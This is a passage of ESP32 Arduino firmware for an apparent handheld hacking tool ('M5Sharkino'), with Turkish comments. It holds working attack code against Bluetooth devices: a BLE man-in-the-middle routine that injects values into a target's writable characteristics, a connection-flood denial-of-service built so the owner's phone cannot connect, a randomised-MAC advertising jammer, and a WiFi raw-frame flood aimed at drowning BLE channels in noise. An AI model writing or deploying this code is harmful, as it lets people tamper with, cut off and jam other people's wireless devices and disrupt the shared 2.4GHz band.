    dispText(0, 38, "Please wait...");
    // Bekleme animasyonu (nokta döngüsü)
    for (uint8_t i = 0; i < 4; i++) {
        display.fillRect(10 + i*26, 50, 18, 8, SSD1306_WHITE);
        dispCommit();
        delay(200);
    }

    bleAdvDeinit();
    BLEDevice::init("M5Sharkino");
    BLEClient* pClient = BLEDevice::createClient();
    GATTClient* gcb = new GATTClient();
    pClient->setClientCallbacks(gcb);

    BLEAddress addr(target.addr.c_str());
    bool ok = pClient->connect(addr);
    if (!ok) {
        dispBanner("Connect failed");
        BLEDevice::deinit(true); delay(300);
        delete gcb;
        return;
    }

    auto svcMap = pClient->getServices();
    OptionList svcList;
    for (auto& s : *svcMap) {
        svcList.push_back({s.first.c_str(), [](){}});
    }
    svcList.push_back({"Back", [](){}});

    int ssel = loopOptions(svcList, "GATT Services");
    if (ssel >= 0 && ssel < (int)svcList.size()-1) {
        auto it = svcMap->begin();
        std::advance(it, ssel);
        BLERemoteService* svc = it->second;
        auto charMap = svc->getCharacteristics();
        OptionList charList;
        for (auto& c : *charMap) {
            String props = "";
            if (c.second->canRead())  props += "R";
            if (c.second->canWrite()) props += "W";
            if (c.second->canNotify())props += "N";
            charList.push_back({String(c.first.c_str()) + String(" [") + props + "]", [](){}});
        }
        charList.push_back({"Back", [](){}});
        int csel = loopOptions(charList, "Characteristics");
        if (csel >= 0 && csel < (int)charList.size()-1) {
            auto cit = charMap->begin();
            std::advance(cit, csel);
            BLERemoteCharacteristic* ch = cit->second;
            if (ch->canRead()) {
                String val = ch->readValue().c_str();
                dispClear();
                dispStatusBar("GATT Read");
                dispText(0, 14, "UUID: " + String(ch->getUUID().toString().c_str()).substring(0,18));
                dispText(0, 28, "Value: " + val.substring(0,20));
                dispText(0, 54, "[BTN] back");
                dispCommit();
                logPush("[GATT] read " + String(ch->getUUID().toString().c_str()) + "=" + val);
                while (!readButton()) delay(50);
            }
        }
    }

    g_xpAnalCnt++;
    xpAdd(XP_PER_BLE_GATT);
    pClient->disconnect();
    BLEDevice::deinit(true); delay(300);
    delete gcb;
}

// ─── BLE MitM GATT Proxy ──────────────────────────────────
// Hedef BLE cihazı ile istemci arasına girerek GATT
// okuma/yazma trafiğini yakalar, değiştirir ve iletir.
// Çalışma prensibi:
//   1) Hedef cihaza BLEClient olarak bağlan (upstream)
//   2) Aynı servis/karakteristikleri BLEServer olarak yayınla (downstream)
//   3) Downstream write'ları upstream'e ilet, cevapları logla
// Not: ESP32 aynı anda hem Client hem Server çalıştırabilir;
//      ancak PSRAM ile stack yeterliliği önemlidir.
static void ble_mitm_run() {
    if (g_bleResults.empty()) {
        dispBanner("Once BLE Scan yap");
        return;
    }

    // Hedef seç
    OptionList devs;
    for (auto& d : g_bleResults)
        devs.push_back({(d.hasName ? d.name : d.addr), [](){}});
    devs.push_back({"Back", [](){}});
    int sel = loopOptions(devs, "MitM: Hedef Sec");
    if (sel < 0 || sel >= (int)g_bleResults.size()) return;

    auto& target = g_bleResults[sel];

    dispClear(); dispStatusBar("BLE MitM");
    dispText(0, 14, "Hedef:");
    dispText(0, 24, target.hasName ? target.name.substring(0,18) : target.addr);
    dispText(0, 36, "Upstream baglanti...");
    dispCommit();

    // ── Upstream: hedef cihaza bağlan ──────────────────────
    bleAdvDeinit();
    BLEDevice::init("M5Sharkino");
    BLEClient* pUpClient = BLEDevice::createClient();
    GATTClient* upCb = new GATTClient();
    pUpClient->setClientCallbacks(upCb);

    BLEAddress upAddr(target.addr.c_str());
    if (!pUpClient->connect(upAddr)) {
        dispBannerErr("Upstream baglanti basarisiz", 1200);
        BLEDevice::deinit(true); delay(300);
        delete upCb;
        return;
    }

    // Servis haritasını al
    auto svcMap = pUpClient->getServices();
    if (!svcMap || svcMap->empty()) {
        dispBannerErr("Servis bulunamadi", 1000);
        pUpClient->disconnect();
        BLEDevice::deinit(true); delay(300);
        delete upCb;
        return;
    }

    dispClear(); dispStatusBar("BLE MitM");
    dispText(0, 14, "Upstream: OK");
    dispText(0, 24, String(svcMap->size()) + " servis bulundu");
    dispText(0, 34, "Proxy baslatiliyor...");
    dispCommit();
    delay(600);

    // ── MitM Proxy döngüsü ────────────────────────────────
    // Her servisteki okunabilir karakteristikleri periyodik oku,
    // yazılabilir olanlara intercept menüsü sun.
    uint32_t readCount  = 0;
    uint32_t writeCount = 0;
    uint32_t lastPoll   = 0;
    uint32_t lastDraw   = 0;

    // Tüm karakteristikleri düz listeye al
    struct MitmChar {
        BLERemoteCharacteristic* ch;
        String svcUUID;
        String chUUID;
        bool canR;
        bool canW;
        bool canN;
        String lastVal;
    };
    std::vector<MitmChar> chars;

    for (auto& sv : *svcMap) {
        auto chMap = sv.second->getCharacteristics();
        if (!chMap) continue;
        for (auto& cv : *chMap) {
            MitmChar mc;
            mc.ch      = cv.second;
            mc.svcUUID = String(sv.first.c_str()).substring(0, 8);
            mc.chUUID  = String(cv.first.c_str()).substring(0, 8);
            mc.canR    = cv.second->canRead();
            mc.canW    = cv.second->canWrite();
            mc.canN    = cv.second->canNotify();
            mc.lastVal = "";
            chars.push_back(mc);
        }
    }

    dispClear(); dispStatusBar("BLE MitM Aktif");
    dispText(0, 14, String(chars.size()) + " char izleniyor");
    dispText(0, 24, "[BTN] char sec/yaz");
    dispText(0, 34, "[LONG] cikis");
    dispCommit();
    delay(800);

    while (!readButtonLong()) {
        // Periyodik okuma (her 1500ms)
        if (millis() - lastPoll > 1500) {
            lastPoll = millis();
            for (auto& mc : chars) {
                if (!mc.canR) continue;
                String val = "";
                // try-catch yerine upCb->connected kontrolü
                if (upCb->connected) {
                    val = mc.ch->readValue().c_str();
                }
                if (val != mc.lastVal) {
                    String logLine = "[MITM_R] " + mc.chUUID + "=" + val.substring(0, 20);
                    logPush(logLine);
                    mc.lastVal = val;
                    readCount++;
                }
            }
        }

        // Ekran güncelleme (her 400ms)
        if (millis() - lastDraw > 400) {
            lastDraw = millis();
            dispClear(); dispStatusBar("BLE MitM Proxy");
            dispText(0, 12, "Okuma: " + String(readCount));
            dispText(0, 22, "Yazma: " + String(writeCount));
            dispText(0, 32, "Char: " + String(chars.size()));
            // Son değer görüntüsü
            for (uint8_t i = 0; i < chars.size() && i < 2; i++) {
                if (chars[i].lastVal.length() > 0)
                    dispText(0, 44 + i * 10,
                        chars[i].chUUID.substring(0,6) + ":" +
                        chars[i].lastVal.substring(0, 12));
            }
            dispText(64, 56, "[BTN]yazma");
            dispCommit();
        }

        // Kısa basma: yazılabilir char seç ve değer enjekte et
        if (readButton()) {
            OptionList wchOpts;
            for (auto& mc : chars) {
                if (!mc.canW) continue;
                wchOpts.push_back({mc.chUUID + (mc.canR ? " [RW]" : " [W]"), [](){}});
            }
            if (wchOpts.empty()) {
                dispBannerWarn("Yazilabilir char yok");
                delay(800);
                continue;
            }
            wchOpts.push_back({"Back", [](){}});
            int wsel = loopOptions(wchOpts, "MitM: Yaz Hedef");
            if (wsel < 0 || wsel >= (int)wchOpts.size() - 1) continue;

            // Yazılabilir char listesini yeniden oluştur (indexi eşleştir)
            std::vector<MitmChar*> wchars;
            for (auto& mc : chars)
                if (mc.canW) wchars.push_back(&mc);

            if (wsel < (int)wchars.size()) {
                // Enjeksiyon değeri seçenekleri
                OptionList valOpts = {
                    {"0x00 (sifirla)",    [](){}},
                    {"0xFF (maks)",       [](){}},
                    {"0x01 (aç)",         [](){}},
                    {"0x00 0x00 (çift)",  [](){}},
                    {"AA BB CC DD",       [](){}},
                    {"Back",              [](){}},
                };
                int vsel = loopOptions(valOpts, "Enjeksiyon Degeri");
                if (vsel >= 0 && vsel < 5) {
                    static const uint8_t INJ[][4] = {
                        {0x00},
                        {0xFF},
                        {0x01},
                        {0x00, 0x00},
                        {0xAA, 0xBB, 0xCC, 0xDD},
                    };
                    static const uint8_t INJ_LEN[] = {1, 1, 1, 2, 4};
                    if (upCb->connected) {
                        wchars[wsel]->ch->writeValue(
                            const_cast<uint8_t*>(INJ[vsel]),
                            INJ_LEN[vsel], true);
                        writeCount++;
                        String logLine = "[MITM_W] " + wchars[wsel]->chUUID
                            + " val=0x" + String(INJ[vsel][0], HEX);
                        logPush(logLine);
                        dispBannerOK("Yazildi: " + wchars[wsel]->chUUID.substring(0,8));
                    } else {
                        dispBannerErr("Baglanti koptu!", 1000);
                    }
                }
            }
        }

        delay(50);
    }

    // Temizlik
    g_xpMitmCnt++;
    xpAdd(XP_PER_BLE_MITM);
    pUpClient->disconnect();
    BLEDevice::deinit(true); delay(300);
    delete upCb;
    logPush("[MITM] bitti reads=" + String(readCount) + " writes=" + String(writeCount));
    dispBannerOK("MitM bitti R:" + String(readCount) + " W:" + String(writeCount));
}

// ─── BLE DoS / L2CAP Connection Flood ────────────────────
// Hedef BLE cihazına art arda bağlantı isteği göndererek
// bağlantı yöneticisini tıkar ve mevcut bağlantıları koparır.
// Yöntem:
//   - Hızlı connect/disconnect döngüsü (stack overloading)
//   - Paralel advertising + connection request flood
//   - Rastgele sahte MAC ile sürekli connect isteği
// Not: ESP32 BLEClient pool sınırlı; her iterasyonda
//      deinit+reinit yaparak kaynak sızıntısı önlenir.
static void ble_dos_run() {
    if (g_bleResults.empty()) {
        dispBanner("Once BLE Scan yap");
        return;
    }

    // Mod seç
    OptionList modeOpts = {
        {"Conn Flood (Hizli)",   [](){}},  // 0: hızlı connect/disconnect
        {"Conn+Adv Flood",       [](){}},  // 1: bağlantı + advertising karışımı
        {"Back",                 [](){}},
    };
    int msel = loopOptions(modeOpts, "BLE DoS: Mod");
    if (msel < 0 || msel == 2) return;

    // Hedef seç
    OptionList devs;
    for (auto& d : g_bleResults)
        devs.push_back({(d.hasName ? d.name : d.addr), [](){}});
    devs.push_back({"Back", [](){}});
    int tsel = loopOptions(devs, "DoS: Hedef");
    if (tsel < 0 || tsel >= (int)g_bleResults.size()) return;

    auto& target = g_bleResults[tsel];
    String tAddr  = target.addr;
    String tLabel = target.hasName ? target.name.substring(0,16) : tAddr;

    dispClear(); dispStatusBar("BLE DoS");
    dispText(0, 14, "Hedef: " + tLabel);
    dispText(0, 24, "Mod: " + String(msel == 0 ? "Conn Flood" : "Conn+Adv"));
    dispText(0, 36, "Baslatiliyor...");
    dispCommit();
    delay(600);

    uint32_t attempts  = 0;
    uint32_t successes = 0;
    uint32_t lastDraw  = 0;

    while (!readButtonLong()) {
        // ── Her iterasyonda BLEDevice başlat ──────────────
        bleAdvDeinit();
        BLEDevice::init("ESP");

        if (msel == 1) {
            // Conn+Adv: aynı anda advertising de yap (kaynak tüketimi)
            BLEAdvertising* pAdv = BLEDevice::getAdvertising();
            if (pAdv) {
                BLEAdvertisementData ad;
                uint8_t rnd[8]; esp_fill_random(rnd, 8);
                uint8_t buf[10];
                buf[0] = 9; buf[1] = 0xFF;
                memcpy(buf + 2, rnd, 8);
                ad.addData((char*)buf, 10);
                pAdv->setAdvertisementData(ad);
                pAdv->setMinInterval(0x20);
                pAdv->setMaxInterval(0x20);
                pAdv->start();
            }
        }

        // Connect denemesi
        BLEClient* pClient = BLEDevice::createClient();
        GATTClient* cb = new GATTClient();
        pClient->setClientCallbacks(cb);
        BLEAddress addr(tAddr.c_str());

        // Bağlantı timeout: 800ms
        bool connected = false;
        uint32_t t0 = millis();
        pClient->connect(addr);
        while (!cb->connected && millis() - t0 < 800) delay(10);
        connected = cb->connected;

        if (connected) {
            successes++;
            // Anında disconnect — stack'i boşaltmaz, kuyrukta bırakır
            pClient->disconnect();
            delay(20);
        }
        attempts++;

        // Her iterasyonda deinit — yeni MAC ile yeniden başla
        BLEDevice::deinit(true); delay(300);
        delete cb;

        // Ekran güncelle (her 350ms)
        if (millis() - lastDraw > 350) {
            lastDraw = millis();
            dispClear(); dispStatusBar("BLE DoS AKTIF");
            dispText(0, 12, "Hedef: " + tLabel);
            dispText(0, 22, "Deneme: " + String(attempts));
            dispText(0, 32, "Basari: " + String(successes));
            // Animasyon
            static uint8_t frame = 0; frame++;
            const char* aframes[] = {">>>|", ">>>> ", " >>>", "  >>"};
            dispText(0, 44, String(aframes[frame % 4]) + " FLOOD");
            dispText(0, 56, "[LONG] dur");
            dispCommit();
        }

        delayMicroseconds(100);
    }

    xpAdd(XP_PER_BLE_DOS);
    BLEDevice::deinit(true); delay(300);
    logPush("[BLE_DOS] attempts=" + String(attempts)
            + " successes=" + String(successes)
            + " target=" + tAddr);
    dispBannerOK("DoS bitti: " + String(attempts) + " deneme");
}

// ─── BLE Jammer ───────────────────────────────────────────
// Arduino ESP32 3.3.11: addData(char* data, size_t length) imzası kullanılır.
// ADV_TYPE_NONCONN_IND bu versiyonda tanımlı DEĞİL — setAdvertisementType çağrılmıyor.
// std::string yerine raw char buffer ile çalışır.
// AD structure formatı: [length_byte, type_byte, data_bytes...]
// length_byte = 1 (type) + data_byte_count

static void bleAddAD(BLEAdvertisementData& d, uint8_t type,
                     const uint8_t* data, uint8_t dataLen) {
    uint8_t buf[32];
    if (dataLen > 29) dataLen = 29;
    buf[0] = (uint8_t)(1 + dataLen);   // length = type(1) + data
    buf[1] = type;
    memcpy(buf + 2, data, dataLen);
    d.addData((char*)buf, (size_t)(2 + dataLen));
}

// ═══════════════════════════════════════════════════════════
//  BLE JAMMER — Raw ESP-IDF GAP API
//
//  Eski yaklaşımın sorunu:
//    Arduino BLE stack → tek MAC, tek kanal, delay'li döngü.
//    Telefon diğer 2 kanaldan gerçek cihazları görmeye devam eder.
//
//  Yeni yaklaşım:
//    esp_ble_gap_set_rand_addr()  → her turda yeni sahte MAC
//    esp_ble_gap_config_adv_data_raw() → doğrudan ham payload
//    esp_ble_gap_start_advertising() → minimum interval (0x20=20ms→0x06=3.75ms)
//    3 advertising kanalı (37,38,39) ESP32 tarafından otomatik kullanılır
//    delay yok → sürekli maksimum hız
//
//  Neden daha iyi çalışır:
//    BLE advertising 3 kanalda round-robin gider. Bu kod her pakette
//    MAC ve payload değiştirir, 3 kanalı da aynı anda gürültüyle doldurur.
//    Telefon "yeni cihaz" olarak görmeden önce bir sonraki paket gelir.
// ═══════════════════════════════════════════════════════════

// ── Raw BLE init (Arduino stack bypass) ──────────────────
// ── Arduino BLE stack ile jammer init ────────────────────
// esp_gap_ble_api.h gerektirmez — standart Arduino BLE
// Minimum interval (0x06 = 3.75ms) doğrudan set edilir
static BLEAdvertising* g_jamAdv = nullptr;

static bool rawBleInit() {
    bleAdvDeinit();
    delay(100);
    BLEDevice::init("");
    g_jamAdv = BLEDevice::getAdvertising();
    if (!g_jamAdv) return false;
    g_jamAdv->setMinInterval(0x06);  // 3.75ms minimum
    g_jamAdv->setMaxInterval(0x06);
    return true;
}

static void rawBleDeinit() {
    if (g_jamAdv) { g_jamAdv->stop(); g_jamAdv = nullptr; }
    BLEDevice::deinit(true);
    delay(200);
}

// ── Rastgele MAC üret ─────────────────────────────────────
static void jamBleRandMac(uint8_t* mac) {
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02; // Locally Administered, Unicast
}

// ═══════════════════════════════════════════════════════════
//  BLE Connection DoS (Denial of Service)
//
//  Nasıl çalışır:
//    BLE cihazları SCAN_REQ ve CONNECT_IND paketlerine cevap
//    verirken kısa süreli "busy" (meşgul) duruma girer.
//    Saniyede yüzlerce sahte bağlantı isteği (Connection Request)
//    gönderilerek:
//      - Hedef BLE cihazı sürekli meşgul modda tutulur
//      - Gerçek sahibinin telefonu bağlanamaz
//      - BLE stack'te buffer overflow / timeout oluşabilir
//
//  Teknik:
//    BLEAdvertisementData içine CONNECT_IND benzeri payload
//    ile her döngüde farklı sahte initiator MAC ve Access Address
//    gömülür. Advertising interval minimum (3.75ms) yapılır.
//    Hedef: tüm 3 BLE advertising kanalını (CH37/38/39) doldurmak.
//
//  Kullanım:
//    nrf24JammerRun() içinde BLE flood'un yanında çağrılır.
// ═══════════════════════════════════════════════════════════
static uint32_t g_bleDosPktCount = 0;

// BLE CONNECT_IND benzeri sahte payload üretir
static void bleDosBuildConnPayload(BLEAdvertisementData& advData) {
    // AD Type 0xFF (Manufacturer Specific) içine CONNECT_IND yapısı gömülür
    // InitA (6) + AdvA (6) + Access Address (4) + rastgele = 22 byte
    uint8_t connPkt[22];
    esp_fill_random(connPkt, 22);
    // Geçerli initiator MAC formatı (LSB first, random static)
    connPkt[0] = (connPkt[0] & 0xFE) | 0x02;
    // Access Address: BLE sabit broadcast AA = 0x8E89BED6 (advertising AA)
    // Bağlantı isteği = farklı rastgele AA
    connPkt[12] = connPkt[12]; // rastgele bırak
    bleAddAD(advData, 0xFF, connPkt, 22);
}

// BLE DoS döngüsü — rawBleInit() sonrası çağrılır
static void bleDosFlood() {
    if (!g_jamAdv) return;

    // Her pakette yeni sahte MAC + Connection payload
    BLEAdvertisementData advData;
    uint8_t fakeMac[6];
    jamBleRandMac(fakeMac);

    // ADV_NONCONN_IND type ile gönder (bağlantı isteği simülasyonu)
    uint8_t flags[1] = {0x05}; // LE General Discoverable + BR/EDR Not Supported
    bleAddAD(advData, 0x01, flags, 1);
    bleDosBuildConnPayload(advData);

    g_jamAdv->stop();
    g_jamAdv->setAdvertisementData(advData);
    g_jamAdv->start();
    g_bleDosPktCount++;
}

// ═══════════════════════════════════════════════════════════
//  WiFi 2.4GHz Continuous TX Task  (Core 0)
//
//  Neden işe yarar:
//    BLE advertising kanalları:  CH37=2402MHz  CH38=2426MHz  CH39=2480MHz
//    WiFi kanalları:              CH1 =2412MHz  CH6 =2437MHz  CH11=2462MHz
//    Bu WiFi kanallarında maksimum boyutlu (400 byte) raw frame
//    sürekli basılırsa 2.4GHz bandındaki gürültü artar,
//    BLE advertising paketlerinin SNR'si düşer → telefonlar paketi
//    decode edemez → gerçek cihazlar gözükmez.
//
//  BLE (Core 1) + WiFi TX (Core 0) → ESP32-S3 dual-core paralel
// ═══════════════════════════════════════════════════════════

static volatile bool  g_wifiTxRunning = false;
static TaskHandle_t   g_wifiTxTask    = nullptr;

// BLE kanallarına en yakın WiFi kanalları
static const uint8_t BLE_COVER_CHANNELS[] = {1, 6, 11};  // 2412/2437/2462 MHz
static constexpr uint8_t BLE_CH_CNT = 3;

// Maksimum boyutlu sahte beacon frame (400 byte = WiFi max fragment)
static uint8_t g_wifiTxFrame[400];
static uint16_t g_wifiTxFrameLen = 0;

static void wifiTxBuildFrame() {
    // Sahte data frame — maksimum boyutta, tamamen rastgele içerik
    // Radiotap header (12 byte)
    static const uint8_t radiotap[] = {
        0x00,0x00,0x0c,0x00,
        0x04,0x80,0x00,0x00,
        0x00,0x00,0x00,0x00
    };
    // 802.11 Data frame header
    // Frame Control: Data frame, to DS=0, from DS=0
    static const uint8_t dot11hdr[] = {
        0x08,0x00,           // Frame Control
        0x00,0x00,           // Duration
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,  // DA: broadcast
        0x02,0x11,0x22,0x33,0x44,0x55, // SA: fake
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,  // BSSID: broadcast
        0x00,0x00            // Seq/Frag
    };
    uint16_t off = 0;
    memcpy(g_wifiTxFrame + off, radiotap, sizeof(radiotap)); off += sizeof(radiotap);
    memcpy(g_wifiTxFrame + off, dot11hdr, sizeof(dot11hdr)); off += sizeof(dot11hdr);
    // Geri kalan byte'ları rastgele doldur → maksimum RF doluluk
    esp_fill_random(g_wifiTxFrame + off, sizeof(g_wifiTxFrame) - off);
    g_wifiTxFrameLen = sizeof(g_wifiTxFrame);
}

static void wifiTxTask(void* pvParam) {
    // WiFi'yi APSTA modunda başlat (raw TX için AP gerekli)
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32", "", 1, 1, 1);  // gizli, 1 bağlantı
    esp_wifi_set_promiscuous(true);

    uint8_t chIdx = 0;
    uint32_t txCount = 0;

    while (g_wifiTxRunning) {
        // BLE kanalını kapatan WiFi kanalına geç
        uint8_t ch = BLE_COVER_CHANNELS[chIdx];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

        // Rastgele SA MAC — her burst'te değişir
        g_wifiTxFrame[22] = (uint8_t)(esp_random() & 0xFE) | 0x02;
        g_wifiTxFrame[23] = esp_random() & 0xFF;
        g_wifiTxFrame[24] = esp_random() & 0xFF;

        // Sürekli burst: 20 frame aynı kanalda
        for (uint8_t b = 0; b < 20 && g_wifiTxRunning; b++) {
            esp_wifi_80211_tx(WIFI_IF_AP, g_wifiTxFrame, g_wifiTxFrameLen, false);
            txCount++;
        }

        // Sonraki BLE kanalına geç
        chIdx = (chIdx + 1) % BLE_CH_CNT;
        taskYIELD();
    }

    // Temizlik
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    vTaskDelete(nullptr);
}

static void wifiTxStart() {
    wifiTxBuildFrame();
    g_wifiTxRunning = true;
    // Core sabitleme yok — FreeRTOS scheduler atar
    // (Core 0'a sabitlemek ESP-IDF WiFi/BT event'leriyle çakışabilir)
    xTaskCreate(
        wifiTxTask,
        "wifiJamTx",
        4096,
        nullptr,
        configMAX_PRIORITIES - 2,  // yüksek ama event handler'ların altında
        &g_wifiTxTask
    );
}

static void wifiTxStop() {
    g_wifiTxRunning = false;
    if (g_wifiTxTask) {
        // Task'ın kendini silmesini bekle
        vTaskDelay(pdMS_TO_TICKS(300));
        g_wifiTxTask = nullptr;
    }
}

